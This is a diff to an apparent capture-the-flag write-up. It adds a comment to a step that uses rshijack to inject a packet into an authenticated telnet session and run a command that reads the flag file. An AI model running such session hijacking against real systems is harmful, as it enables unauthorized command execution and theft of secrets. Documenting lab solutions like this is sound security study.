@@ -13,6 +13,7 @@ there have been multiple solutions for this.  Our solution (cyclopropenylidene)
 was waiting until the authentication was done, then inject a tcp packet into
 the telnet connection:
 
+    # if you don't know one of the ports use 0 to match any port
     echo 'cat ~/.ctf_flag' | sudo rshijack tap0 172.16.13.20:37386 172.16.13.19:23
 
 After some attempts this command was accepted and executed by the telnet
